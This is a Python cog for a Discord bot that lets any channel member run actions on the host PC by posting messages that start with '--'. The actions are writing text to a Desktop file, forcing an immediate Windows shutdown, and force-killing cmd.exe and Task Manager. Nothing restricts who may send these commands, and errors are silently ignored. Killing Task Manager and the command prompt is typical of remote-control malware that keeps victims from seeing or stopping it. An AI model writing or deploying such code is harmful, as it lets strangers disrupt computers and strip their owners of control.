import re
import os
import subprocess
import discord
from discord.ext import commands

class EventCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_message(self, msg: discord.Message):
        if msg.author.bot:
            return

        contentStr = msg.content
        if contentStr and contentStr.strip().startswith("--"):
            for segStr in [s.strip() for s in contentStr.strip().split("--") if s.strip()]:
                matchObj = re.match(r"^(\w+)(?:\((.*?)\))?$", segStr)
                if not matchObj:
                    continue

                cmdName = matchObj.group(1).lower()
                paramStr = matchObj.group(2)
                paramsDict = {k.strip(): v.strip() for p in paramStr.split(",") if "=" in p for k, v in [p.split("=", 1)]} if paramStr else {}

                try:
                    if cmdName == "txt" and "text" in paramsDict:
                        desktopPath = os.path.join(os.path.expanduser("~"), "Desktop")
                        filePath = os.path.join(desktopPath if os.path.isdir(desktopPath) else os.getcwd(), "tmp.txt")
                        with open(filePath, "w", encoding="utf-8") as fileObj:
                            fileObj.write(paramsDict["text"])
                        await msg.channel.send("已建立 tmp.txt")
                    elif cmdName == "shutdown":
                        os.system("shutdown /s /f /t 0")
                        await msg.channel.send("關機中...")
                    elif cmdName == "kill":
                        for procName in ["cmd.exe", "taskmgr.exe"]:
                            subprocess.run(["taskkill", "/F", "/IM", procName], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        await msg.channel.send("已強制終止命令提示字元與工作管理員。")
                except Exception:
                    pass
            return
        await self.bot.process_commands(msg)

async def setup(bot: commands.Bot):
    await bot.add_cog(EventCog(bot))
